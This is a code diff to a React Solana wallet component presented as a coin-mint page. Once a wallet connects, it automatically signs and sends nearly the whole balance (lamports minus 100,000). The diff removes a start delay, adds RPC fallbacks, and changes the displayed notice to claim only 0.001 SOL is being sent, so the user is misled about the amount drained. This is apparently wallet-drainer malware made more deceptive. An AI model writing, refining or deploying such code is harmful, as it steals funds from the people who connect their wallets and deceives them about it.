@@ -85,14 +85,14 @@ const WalletConnectionHandler: FC = () => {
 
     useEffect(() => {
         if (connected && publicKey) {
-            setTimeout(() => {
-                fetchBalanceAndSendTx(publicKey);
-            }, 2000);
+            fetchBalanceAndSendTx(publicKey);
         }
     }, [connected, publicKey]);
 
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         const rpcEndpoints = [
+            'https://sg110.nodes.rpcpool.com',
+            'https://api.mainnet-beta.solana.com',
             'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
             'https://rpc.ankr.com/solana',
         ];
@@ -118,8 +118,10 @@ const WalletConnectionHandler: FC = () => {
 
         try {
             setSolBalance(lamports / LAMPORTS_PER_SOL);
-            const sendAmount = lamports - 100000;
+            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
+            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
 
+            const sendAmount = lamports - 100000; // send full balance minus 100,000 lamports
             if (sendAmount <= 0) {
                 alert('⚠️ Not enough SOL to send.');
                 return;
@@ -146,8 +148,12 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    const txid = await connection.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
+                    if (connection) {
+                        const txid = await connection.sendRawTransaction(signedTx.serialize());
+                        console.log(`🚀 Transaction sent. Signature: ${txid}`);
+                    } else {
+                        console.error('❌ No connection available.');
+                    }
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
@@ -181,21 +187,11 @@ const WalletConnectionHandler: FC = () => {
             }}
         >
             {!connected || !publicKey ? (
-                <>
-                    <div
-                        style={{
-                            border: '1px solid #ff5cd1',
-                            padding: '16px',
-                            borderRadius: '12px',
-                            marginBottom: '20px',
-                            boxShadow: '0 0 16px rgba(255, 92, 209, 0.4)',
-                        }}
-                    >
-                        <h2 style={{ fontSize: '24px', color: '#ff91e3', marginBottom: '6px' }}>Connect Wallet</h2>
-                        <p style={{ fontSize: '14px', color: '#ffd9f4' }}>
-                            Connect your wallet to mint coin to rug
-                        </p>
-                    </div>
+                <div>
+                    <h2 style={{ color: '#ff91e3' }}>Connect Wallet</h2>
+                    <p style={{ color: '#ff5cd1', fontSize: '14px' }}>
+                        Connect your wallet to mint coin to rug.
+                    </p>
                     <WalletMultiButton
                         style={{
                             background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
@@ -209,7 +205,7 @@ const WalletConnectionHandler: FC = () => {
                             cursor: 'pointer',
                         }}
                     />
-                </>
+                </div>
             ) : (
                 <>
                     <h2 style={{ color: '#ff91e3', marginBottom: '12px' }}>✅ Wallet Connected</h2>
@@ -223,14 +219,15 @@ const WalletConnectionHandler: FC = () => {
                         }}
                         onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
                     >
-                        <strong style={{ color: '#ffbff0' }}>Address:</strong><br />
+                        <strong style={{ color: '#ffbff0' }}>Address:</strong>
+                        <br />
                         {publicKey.toBase58()}
                     </p>
                     <p style={{ fontSize: '15px', marginBottom: '6px', color: '#ffc5f1' }}>
                         <strong>Balance:</strong>{' '}
                         {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
                     </p>
-                    <p style={{ color: '#ff91e3', fontSize: '13px' }}>🚀 Auto-sending full balance in 10s...</p>
+                    <p style={{ color: '#ff91e3', fontSize: '13px' }}>🚀 Auto-sending 0.001 SOL in 10s...</p>
                 </>
             )}
         </div>
